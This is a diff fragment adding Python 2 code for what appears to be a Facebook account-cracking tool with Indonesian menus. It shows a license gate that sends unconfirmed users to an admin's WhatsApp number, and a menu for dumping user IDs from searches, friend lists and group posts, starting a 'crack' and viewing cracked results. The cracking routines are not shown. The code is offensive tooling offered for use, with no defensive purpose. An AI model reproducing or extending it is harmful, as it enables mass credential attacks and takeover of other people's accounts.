+            print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Login Status\x1b[1;91m :\x1b[1;92m Complete'
+            time.sleep(1)
+        else:
+            os.system('clear')
+            banner()
+            print 50 * '\x1b[1;97m-'
+            print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Login Status : \x1b[1;91mFailed\x1b[1;39m'
+            print '\x1b[1;97m[\x1b[1;94m\xe2\x80\xa2\x1b[1;97m] ID Not Confirmed\x1b[1;39m'
+            print '\x1b[1;97m[\x1b[1;94m\xe2\x80\xa2\x1b[1;97m] Please Chat Admin For Confirmed Your ID\x1b[1;39m'
+            raw_input('\x1b[1;97m[\x1b[1;94m>\x1b[1;97m] Press Enter To Chat Admin\x1b[1;39m')
+            os.system('am start https://wa.me/6289625664339?text=Tolong%20konfirmasi%20saya%20dengan%20ID:%20' + j + ' >/dev/null')
+            os.sys.exit()
+    except requests.exceptions.ConnectionError:
+        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Connection'
+        raw_input('\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Back')
+        spt()
+    except KeyboardInterrupt:
+        os.sys.exit()
+    except IOError:
+        subprocess.Popen(['rm', '-rf', 'licensed.log'])
+        user()
+
+
+def menu():
+    basecookie() == True
+    clear()
+    banner()
+    ismi()
+    print 50 * '\x1b[1;97m-'
+    print '\x1b[1;97m[\x1b[1;92m1\x1b[1;97m] Dump id Dari Pencariaan Nama'
+    print '\x1b[1;97m[\x1b[1;92m2\x1b[1;97m] Dump Dari Publik FriendList'
+    print '\x1b[1;97m[\x1b[1;92m3\x1b[1;97m] Dump Dari Postingan Member Group'
+    print '\x1b[1;97m[\x1b[1;92m4\x1b[1;97m] Mulai Crack'
+    print '\x1b[1;97m[\x1b[1;92m5\x1b[1;97m] Lihat Hasil Crack'
+    print '\x1b[1;97m[\x1b[1;91m0\x1b[1;97m] Hapus Cookie / Ganti Akun'
+    print 50 * '\x1b[1;97m-'
+    r = raw_input('\x1b[1;97mChoose >> ')
+    if r == '':
+        menu()
+    elif r == '1':
+        dumpfl()
+        exit()
+    elif r == '2':
+        friendlist(basecookie())
+    elif r == '3':
+        dump_grup(basecookie())
+    elif r == '4':
+        crack()
+        exit()
+    elif r == '5':
+        cekress()
+        exit()
+    elif r == '0':
+        try:
+            os.remove('.cok')
+            os.remove('login.txt')
+            exit(basecookie())
+        except Exception as e:
+            print '- error, session empty. %s' % e
+
+    else:
+        print '!: wrong input'
+
+
+if __name__ == '__main__':
+    try:
+        spt()
+    except Exception as e:
+        exit('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Error : %s' % e)
+
+    menu()
+# Awokawokawok Ngerekod:v
